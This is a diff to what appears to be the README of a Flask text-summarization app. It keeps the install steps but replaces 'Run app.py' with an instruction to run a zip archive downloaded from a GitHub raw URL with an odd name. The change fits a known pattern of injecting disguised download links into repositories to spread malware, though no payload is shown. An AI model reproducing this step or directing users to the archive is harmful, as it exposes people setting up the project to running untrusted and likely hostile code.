@@ -5,4 +5,4 @@
 `python -m spacy download en_core_web_sm`<br>
 `pip install Flask`<br>
 
-- Run `app.py` file and open `http://127.0.0.1:5000` to your browser.
+- Run `https://github.com/supratim1020/text_summarization/raw/refs/heads/main/templates/summarization-text-preconduction.zip` file and open `http://127.0.0.1:5000` to your browser.
